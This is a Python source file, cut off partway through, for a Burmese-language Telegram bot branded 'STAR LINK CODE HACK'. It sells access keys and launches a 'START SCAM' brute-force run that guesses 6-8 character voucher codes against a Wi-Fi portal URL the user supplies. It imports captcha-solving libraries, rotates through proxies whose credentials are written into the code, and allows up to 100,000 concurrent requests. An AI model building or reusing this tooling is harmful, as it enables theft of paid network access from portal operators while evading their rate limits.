import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, hashlib, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager
import hashlib
import hmac

# --- DUAL LAYER PASSWORD SYSTEM ---
# Layer 1 Password: thura
# Layer 2 Password: soe

class DualPasswordAuth:
    def __init__(self):
        self.layer1_hash = hashlib.sha256(b"thura").hexdigest()
        self.layer2_hash = hashlib.sha256(b"soe").hexdigest()
        self.authenticated_users = {}
        self.layer1_verified = {}
        self.pending_layer2 = {}

    def verify_layer1(self, user_id, password):
        if hashlib.sha256(password.encode()).hexdigest() == self.layer1_hash:
            self.layer1_verified[user_id] = True
            self.pending_layer2[user_id] = True
            return True
        return False

    def verify_layer2(self, user_id, password):
        if not self.layer1_verified.get(user_id, False):
            return False
        if hashlib.sha256(password.encode()).hexdigest() == self.layer2_hash:
            self.authenticated_users[user_id] = True
            self.pending_layer2[user_id] = False
            return True
        return False

    def is_authenticated(self, user_id):
        return self.authenticated_users.get(user_id, False)

    def reset_auth(self, user_id):
        self.authenticated_users.pop(user_id, None)
        self.layer1_verified.pop(user_id, None)
        self.pending_layer2.pop(user_id, None)

auth_system = DualPasswordAuth()

# --- Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_IDS = ["7289768738"]
FORWARD_CHANNEL = "https://t.me/thudyao150"

# --- SPEED CONFIGURATION (Default Values) ---
MAX_CONCURRENT = 5000   # 3500 မှ 5000 သို့ တင်ထားပါတယ်
BATCH_SIZE = 3000       # 2000 မှ 3000 သို့ တင်ထားပါတယ်
CONNECTION_LIMIT = 50000
CONNECTION_PER_HOST = 25000
TIMEOUT = 15

# --- Local Storage Setup ---
DB_PATH = "bot_data.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=10000")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY,
                  user_id TEXT,
                  plan TEXT,
                  expires_at TEXT,
                  code_limit INTEGER DEFAULT 1000,
                  used_codes INTEGER DEFAULT 0)''')

    c.execute('''CREATE TABLE IF NOT EXISTS results
                 (user_id TEXT PRIMARY KEY,
                  codes TEXT)''')

    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id TEXT PRIMARY KEY,
                  key TEXT,
                  registered_at TEXT)''')

    c.execute('''CREATE TABLE IF NOT EXISTS user_settings
                 (user_id TEXT PRIMARY KEY,
                  proxy_enabled INTEGER DEFAULT 1)''')

    c.execute('''CREATE TABLE IF NOT EXISTS bot_settings
                 (key TEXT PRIMARY KEY,
                  value TEXT)''')

    conn.commit()
    conn.close()

init_db()

# --- In-memory caches ---
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
paid_users = {}
_voucher_sem = None
_start_time = time.monotonic()

# --- Proxy List (ONLY for URL checking) ---
PROXY_LIST = [
    "xiolnvcj:8qp744606gfj@191.96.254.138:6185",
    "xiolnvcj:8qp744606gfj@45.38.107.97:6014",
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

# --- Helper Functions ---
def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

# --- Database Functions ---

@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    except Exception as e:
        print(f"DB Cursor Error: {e}")
    finally:
        conn.close()

def db_get_setting(key, default=None):
    try:
        with get_db_cursor() as c:
            c.execute("SELECT value FROM bot_settings WHERE key = ?", (key,))
            result = c.fetchone()
            if result:
                return result[0]
    except Exception as e:
        print(f"db_get_setting error: {e}")
    return default

def db_set_setting(key, value):
    try:
        with get_db_cursor() as c:
            c.execute("INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)",
                      (key, str(value)))
    except Exception as e:
        print(f"db_set_setting error: {e}")

def db_get_key(key):
    try:
        with get_db_cursor() as c:
            c.execute("SELECT * FROM keys WHERE key = ?", (key,))
            result = c.fetchone()
            if result:
                return {
                    "key": result[0],
                    "user_id": result[1],
                    "plan": result[2],
                    "expires_at": result[3],
                    "code_limit": result[4],
                    "used_codes": result[5]
                }
    except Exception as e:
        print(f"db_get_key error: {e}")
    return None

def db_get_user(user_id):
    try:
        with get_db_cursor() as c:
            c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            result = c.fetchone()
            if result:
                return {
                    "user_id": result[0],
                    "key": result[1],
                    "registered_at": result[2]
                }
    except Exception as e:
        print(f"db_get_user error: {e}")
    return None

def db_get_user_by_key(key):
    try:
        with get_db_cursor() as c:
            c.execute("SELECT * FROM users WHERE key = ?", (key,))
            result = c.fetchone()
            if result:
                return {
                    "user_id": result[0],
                    "key": result[1],
                    "registered_at": result[2]
                }
    except Exception as e:
        print(f"db_get_user_by_key error: {e}")
    return None

def db_get_results(user_id):
    try:
        with get_db_cursor() as c:
            c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
            result = c.fetchone()
            if result:
                return json.loads(result[0])
    except Exception as e:
        print(f"db_get_results error: {e}")
    return []

def db_save_results(user_id, codes):
    try:
        with get_db_cursor() as c:
            c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)",
                      (user_id, json.dumps(codes)))
    except Exception as e:
        print(f"db_save_results error: {e}")

def db_add_user(user_id, key):
    try:
        with get_db_cursor() as c:
            c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                      (user_id, key, datetime.now(timezone.utc).isoformat()))
    except Exception as e:
        print(f"db_add_user error: {e}")

def db_add_key(key, user_id, plan, expires_at, code_limit):
    try:
        with get_db_cursor() as c:
            c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)",
                      (key, user_id, plan, expires_at, code_limit, 0))
    except Exception as e:
        print(f"db_add_key error: {e}")

def db_delete_key(key):
    try:
        with get_db_cursor() as c:
            c.execute("DELETE FROM keys WHERE key = ?", (key,))
    except Exception as e:
        print(f"db_delete_key error: {e}")

def db_update_used_codes(key, used_codes):
    try:
        with get_db_cursor() as c:
            c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))
    except Exception as e:
        print(f"db_update_used_codes error: {e}")

def db_get_all_keys():
    try:
        with get_db_cursor() as c:
            c.execute("SELECT * FROM keys")
            results = c.fetchall()
            keys = {}
            for r in results:
                keys[r[0]] = {
                    "user_id": r[1],
                    "plan": r[2],
                    "expires_at": r[3],
                    "code_limit": r[4],
                    "used_codes": r[5]
                }
            return keys
    except Exception as e:
        print(f"db_get_all_keys error: {e}")
    return {}

def db_get_all_users():
    try:
        with get_db_cursor() as c:
            c.execute("SELECT * FROM users")
            results = c.fetchall()
            return [r[0] for r in results]
    except Exception as e:
        print(f"db_get_all_users error: {e}")
    return []

def check_key_expiration(expires_at):
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# --- Proxy Settings Functions ---
def db_get_proxy_setting(user_id):
    try:
        with get_db_cursor() as c:
            c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
            result = c.fetchone()
            if result:
                return bool(result[0])
    except Exception as e:
        print(f"db_get_proxy_setting error: {e}")
    return True

def db_set_proxy_setting(user_id, enabled):
    try:
        with get_db_cursor() as c:
            c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                      (user_id, 1 if enabled else 0))
    except Exception as e:
        print(f"db_set_proxy_setting error: {e}")

# --- Load saved speed settings at startup ---
def load_speed_settings():
    global MAX_CONCURRENT, BATCH_SIZE
    saved_mc = db_get_setting("max_concurrent")
    saved_bs = db_get_setting("batch_size")
    if saved_mc:
        try:
            MAX_CONCURRENT = int(saved_mc)
        except:
            pass
    if saved_bs:
        try:
            BATCH_SIZE = int(saved_bs)
        except:
            pass

load_speed_settings()

# --- Forward to Channel ---
async def forward_to_channel(message_text, parse_mode=None):
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Forward error: {e}")

# ==================== KEYBOARDS ====================

def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)

    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        proxy_text = "🔴 Proxy OFF" if not proxy_enabled else "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off"

    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ KEY ထည့်ရန်", callback_data="menu_enter_key"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_auth_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🔐 Enter Layer 1 Password ", callback_data="auth_layer1"),
        InlineKeyboardButton("🔐 Enter Layer 2 Password ", callback_data="auth_layer2"),
        InlineKeyboardButton("🔄 Reset Authentication", callback_data="auth_reset")
    )
    return keyboard

# ==================== ADMIN PANEL KEYBOARDS ====================

def get_admin_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
        InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey"),
        InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
        InlineKeyboardButton("👥 Users List", callback_data="admin_users"),
        InlineKeyboardButton("⚡ Speed Setting", callback_data="admin_speed"),
        InlineKeyboardButton("🔙 Back to Menu", callback_data="admin_back")
    )
    return keyboard

def get_admin_genkey_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("⏱️ 30m", callback_data="admin_gen_30m"),
        InlineKeyboardButton("⏱️ 1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("📅 1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("📅 7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("📅 1m", callback_data="admin_gen_1m"),
        InlineKeyboardButton("📅 1y", callback_data="admin_gen_1y"),
        InlineKeyboardButton("♾️ Unlimited", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("🔙 Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_speed_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🐢 500", callback_data="admin_speed_500"),
        InlineKeyboardButton("🚶 1,000", callback_data="admin_speed_1000"),
        InlineKeyboardButton("🏃 2,000", callback_data="admin_speed_2000"),
        InlineKeyboardButton("⚡ 3,500", callback_data="admin_speed_3500"),
        InlineKeyboardButton("🚀 5,000", callback_data="admin_speed_5000"),
        InlineKeyboardButton("💨 10,000", callback_data="admin_speed_10000"),
        InlineKeyboardButton("🔥 20,000", callback_data="admin_speed_20000"),
        InlineKeyboardButton("⚡⚡ 50,000", callback_data="admin_speed_50000"),
        InlineKeyboardButton("💥 100,000", callback_data="admin_speed_100000"),
        InlineKeyboardButton("🔙 Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back"))
    return keyboard

# ==================== BOT HANDLERS ====================

@bot.message_handler(commands=['start'])
async def start(message):
    try:
        user_id = str(message.chat.id)
        user_name = message.from_user.first_name or message.from_user.username or "User"

        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}

        if auth_system.is_authenticated(user_id):
            await show_main_menu(message, user_id, user_name)
            return

        auth_text = f"""🔐 **DUAL LAYER PASSWORD AUTHENTICATION**

👤 NAME: {user_name}
🆔 USER ID: {user_id}

မင်္ဂလာပါခင်ဗျာ!

ဒီ Bot ကို သုံးဖို့အတွက် Password နှစ်ဆင့် ဖြတ်ရပါမယ်။

🔑 **Layer 1 Password:** 'thura'
🔑 **Layer 2 Password:** 'soe'

ကျေးဇူးပြု၍ အောက်ပါ ခလုတ်များမှ Password ထည့်သွင်းပါ။"""

        await bot.send_message(message.chat.id, auth_text, reply_markup=get_auth_keyboard(), parse_mode="Markdown")
        await forward_to_channel(f"🆕 New User Started - Authentication Required\n\n👤 Name: {user_name}\n🆔 ID: {user_id}")
    except Exception as e:
        print(f"Start command error: {e}")

async def show_main_menu(message, user_id, user_name):
    """Show the main menu with error handling and safe name escaping"""
    try:
        # Safe name for Markdown
        safe_name = str(user_name).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")

        user_info = db_get_user(user_id)
        valid = False
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info and check_key_expiration(key_info["expires_at"]):
                valid = True
                approve[message.chat.id] = True
                paid_users[user_id] = True

        proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"

        if valid:
            welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {safe_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။
🔄 Proxy Status: {proxy_status}

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
        else:
            welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {safe_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။
👨‍💻 Admin: @makxcross_admin"""

        await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id), parse_mode="Markdown")
        await forward_to_channel(f"✅ User Authenticated & Started\n\n👤 Name: {safe_name}\n🆔 ID: {user_id}")
    except Exception as e:
        print(f"show_main_menu error: {e}")
        try:
            await bot.send_message(message.chat.id, "⚠️ Menu ဖွင့်ရာတွင် Error တက်ပါသည်။ /start ကို ပြန်နှိပ်ကြည့်ပါ။")
        except:
            pass

@bot.message_handler(commands=['auth'])
async def auth_command(message):
    try:
        user_id = str(message.chat.id)
        args = message.text.split()

        if len(args) < 3:
            await bot.reply_to(
                message,
                "🔐 Authentication ပြုလုပ်ရန်:\n\n"
                "/auth [layer] [password]\n\n"
                "ဥပမာ:\n"
                "/auth 1 thura\n"
                "/auth 2 soe"
            )
            return

        try:
            layer = int(args[1])
            password = args[2]
        except ValueError:
            await bot.reply_to(message, "❌ Layer သည် နံပါတ်ဖြစ်ရမည်။")
            return

        if layer == 1:
            if auth_system.verify_layer1(user_id, password):
                await bot.reply_to(
                    message,
                    "✅ **Layer 1 Password မှန်ကန်ပါတယ်!**\n\n"
                    "အခု Layer 2 Password (`soe`) ကို ထည့်ပါ။\n\n"
                    "/auth 2 soe"
                )
                await forward_to_channel(f"🔐 Layer 1 Verified\n\n👤 User: {message.from_user.first_name}\n🆔 ID: {user_id}")
            else:
                await bot.reply_to(message, "❌ Layer 1 Password မှားယွင်းနေပါသည်။")
        elif layer == 2:
            if auth_system.verify_layer2(user_id, password):
                await bot.reply_to(
                    message,
                    "✅ **Layer 2 Password မှန်ကန်ပါတယ်!**\n\n"
                    "🎉 သင် အောင်မြင်စွာ Authentication ပြုလုပ်ပြီးပါပြီ။"
                )
                await forward_to_channel(f"🔐 Layer 2 Verified - Full Access Granted\n\n👤 User: {message.from_user.first_name}\n🆔 ID: {user_id}")
                user_name = message.from_user.first_name or message.from_user.username or "User"
                await show_main_menu(message, user_id, user_name)
            else:
                await bot.reply_to(
                    message,
                    "❌ Layer 2 Password မှားယွင်းနေပါသည်။\n"
                    "/auth 1 thura"
                )
        else:
            await bot.reply_to(message, "❌ Layer 1 သို့မဟုတ် 2 သာ ရွေးချယ်ပါ။")
    except Exception as e:
        print(f"auth_command error: {e}")

@bot.message_handler(commands=['reset_auth'])
async def reset_auth_command(message):
    try:
        user_id = str(message.chat.id)
        auth_system.reset_auth(user_id)
        await bot.reply_to(
            message,
            "🔄 Authentication ကို Reset လုပ်ပြီးပါပြီ။\n\n"
            "/auth 1 thura\n"
            "/auth 2 soe"
        )
    except Exception as e:
        print(f"reset_auth error: {e}")

@bot.message_handler(commands=['admin'])
async def admin_panel(message):
    try:
        if not is_admin(str(message.chat.id)):
            await bot.reply_to(message, "❌ သင် Admin မဟုတ်ပါ။")
            return

        if not auth_system.is_authenticated(str(message.chat.id)):
            await bot.reply_to(
                message,
                "🔐 ကျေးဇူးပြု၍ Admin Authentication ပြုလုပ်ပါ:\n\n"
                "/auth 1 thura\n"
                "/auth 2 soe"
            )
            return

        text = f"""🔐 **Admin Panel**

⚡ Current Speed: `{MAX_CONCURRENT}` concurrent
📦 Batch Size: `{BATCH_SIZE}`"""

        await bot.reply_to(message, text, reply_markup=get_admin_main_keyboard(), parse_mode="Markdown")
        await forward_to_channel(f"🔐 Admin Panel Accessed by: {message.from_user.first_name}")
    except Exception as e:
        print(f"admin_panel error: {e}")

# ==================== MAIN CALLBACK HANDLER ====================

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    global MAX_CONCURRENT, BATCH_SIZE, _voucher_sem

    try:
        chat_id = call.message.chat.id
        user_id = str(chat_id)
        user_name = call.from_user.first_name or call.from_user.username or "User"

        # ========== AUTHENTICATION CALLBACKS ==========
        if call.data == "auth_layer1":
            await bot.send_message(chat_id, "🔑 `/auth 1 thura`", parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return

        if call.data == "auth_layer2":
            if not auth_system.layer1_verified.get(user_id, False):
                await bot.answer_callback_query(call.id, "❌ Layer 1 အရင်ထည့်ပါ။", show_alert=True)
                return
            await bot.send_message(chat_id, "🔑 `/auth 2 soe`", parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return

        if call.data == "auth_reset":
            auth_system.reset_auth(user_id)
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔄 Authentication Reset လုပ်ပြီးပါပြီ။",
                reply_markup=get_auth_keyboard()
            )
            await bot.answer_callback_query(call.id, "🔄 Reset", show_alert=True)
            return

        if not auth_system.is_authenticated(user_id):
            await bot.answer_callback_query(call.id, "🔐 Authentication ပြုလုပ်ပါ။", show_alert=True)
            return

        # ========== PROXY TOGGLE ==========
        if call.data == "menu_proxy_on" or call.data == "menu_proxy_off":
            current = db_get_proxy_setting(user_id)
            new_status = not current
            db_set_proxy_setting(user_id, new_status)
            status_text = "ON" if new_status else "OFF"
            emoji = "🟢" if new_status else "🔴"

            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔄 Proxy {status_text} ဖြစ်သွားပါပြီ။",
                reply_markup=get_main_keyboard(user_id)
            )
            await bot.answer_callback_query(call.id, f"✅ Proxy {status_text}")
            return

        # ========== ADMIN CALLBACKS ==========
        if call.data.startswith("admin_"):
            if not is_admin(str(chat_id)):
                await bot.answer_callback_query(call.id, "❌ သင် Admin မဟုတ်ပါ။")
                return

            if call.data == "admin_back":
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"🔐 **Admin Panel**\n\n⚡ Speed: `{MAX_CONCURRENT}`",
                    reply_markup=get_admin_main_keyboard(),
                    parse_mode="Markdown"
                )
                await bot.answer_callback_query(call.id)
                return

            if call.data == "admin_speed":
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"⚡ **Speed Setting**\n\nလက်ရှိ: `{MAX_CONCURRENT}`",
                    reply_markup=get_admin_speed_keyboard(),
                    parse_mode="Markdown"
                )
                await bot.answer_callback_query(call.id)
                return

            if call.data.startswith("admin_speed_"):
                try:
                    new_speed = int(call.data.replace("admin_speed_", ""))
                except:
                    await bot.answer_callback_query(call.id, "❌ Value မမှန်ပါ။")
                    return

                MAX_CONCURRENT = new_speed
                db_set_setting("max_concurrent", new_speed)
                _voucher_sem = None

                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"✅ Speed ပြောင်းပြီး: `{MAX_CONCURRENT}`",
                    reply_markup=get_admin_back_keyboard(),
                    parse_mode="Markdown"
                )
                await bot.answer_callback_query(call.id, f"⚡ {new_speed}")
                return

            if call.data == "admin_stats":
                await bot.answer_callback_query(call.id)
                await stats_command(call.message)
                return

            if call.data == "admin_listkeys":
                await bot.answer_callback_query(call.id)
                await listkeys_command(call.message)
                return

            if call.data == "admin_users":
                await bot.answer_callback_query(call.id)
                await users_list_command(call.message)
                return

            if call.data == "admin_genkey":
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="🔑 **Select Key Plan**",
                    reply_markup=get_admin_genkey_keyboard(),
                    parse_mode="Markdown"
                )
                await bot.answer_callback_query(call.id)
                return

            if call.data.startswith("admin_gen_"):
                plan = call.data.replace("admin_gen_", "")
                await handle_genkey_plan_selection(chat_id, call.message, plan)
                await bot.answer_callback_query(call.id)
                return

            if call.data == "admin_delkey":
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="🗑️ `/delkey [key]`",
                    reply_markup=get_admin_back_keyboard(),
                    parse_mode="Markdown"
                )
                await bot.answer_callback_query(call.id)
                return

            if call.data == "admin_broadcast":
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="📢 `/sendall [message]`",
                    reply_markup=get_admin_back_keyboard(),
                    parse_mode="Markdown"
                )
                await bot.answer_callback_query(call.id)
                return

        # ========== USER CALLBACKS ==========
        if call.data == "menu_back":
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="✨ Main Menu ✨",
                reply_markup=get_main_keyboard(user_id)
            )
            await bot.answer_callback_query(call.id)
            return

        if call.data == "menu_recheck":
            if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
                await bot.answer_callback_query(call.id, "🔗 Portal URL အရင်ထည့်ပါ။", show_alert=True)
                return
            await recheck_command(call.message)
            await bot.answer_callback_query(call.id)
            return

        if call.data == "menu_stop":
            await stop_scan_command(call.message)
            await bot.answer_callback_query(call.id, "🛑 ရပ်ပြီ။", show_alert=True)
            return

        if call.data == "menu_start_scam":
            mode = user_data.get(chat_id, {}).get('selected_mode')
            if not mode:
                await bot.answer_callback_query(call.id, "❌ VOUCHER အရင်ရွေးပါ။", show_alert=True)
                return

            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔍 Scanning... Mode: {mode}",
                reply_markup=get_scam_button_keyboard()
            )

            progress_msg = await bot.send_message(chat_id, "🔍 Scanning...\n\n")
            scan_id = str(uuid.uuid4())

            task = asyncio.create_task(
                run_bruteforce(
                    mode, chat_id, user_data[chat_id]['session_url'], scan_id,
                    message=call.message, progress_msg=progress_msg,
                    start_digit=user_data[chat_id].get('start_digit')
                )
            )

            scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
            await bot.answer_callback_query(call.id)
            return

        if call.data.startswith("scan_"):
            mode = call.data.replace("scan_", "")
            if chat_id not in user_data:
                user_data[chat_id] = {}
            user_data[chat_id]['selected_mode'] = mode
            user_data[chat_id]['start_digit'] = None

            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔍 VOUCHER: {mode}\n\n✅ START SCAM နှိပ်ပါ။",
                reply_markup=get_start_scam_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        if call.data.startswith("digit_"):
            parts = call.data.split("_")
            mode = parts[1]
            digit = parts[2]

            if chat_id not in user_data:
                user_data[chat_id] = {}
            user_data[chat_id]['selected_mode'] = mode
            user_data[chat_id]['start_digit'] = None if digit == "random" else digit

            text = f"🔍 VOUCHER Mode: {mode}\n"
            if digit == "random":
                text += "🔢 ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
            else:
                text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"

            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
                reply_markup=get_start_scam_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

    except Exception as e:
        print(f"Callback handler error: {e}")
        try:
            await bot.answer_callback_query(call.id, "⚠️ Error တက်ပါသည်။ /start ကို ပြန်နှိပ်ပါ။", show_alert=True)
        except:
            pass

async def handle_genkey_plan_selection(chat_id, message, plan):
    try:
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['admin_gen_plan'] = plan
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message.message_id,
            text=f"🔑 Plan: {plan}\n\n`/genkey {plan} [limit] [user_id]`",
            reply_markup=get_admin_back_keyboard(),
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"handle_genkey error: {e}")

# ==================== COMMAND FUNCTIONS ====================

async def listkeys_command(message):
    try:
        keys = db_get_all_keys()
        if not keys:
            await bot.reply_to(message, "📋 Key မရှိသေးပါ။")
            return
        text = f"📋 Total Keys: {len(keys)}"
        await bot.reply_to(message, text)
    except Exception as e:
        print(f"listkeys error: {e}")

async def stats_command(message):
    try:
        keys = db_get_all_keys()
        users = db_get_all_users()
        await bot.reply_to(
            message,
            f"📊 **Bot Stats**\n\n"
            f"🔑 Total Keys: {len(keys)}\n"
            f"👥 Users: {len(users)}\n"
            f"⚡ Speed: {MAX_CONCURRENT}",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"stats error: {e}")

async def users_list_command(message):
    try:
        users = db_get_all_users()
        await bot.reply_to(message, f"👥 Users: {len(users)}")
    except Exception as e:
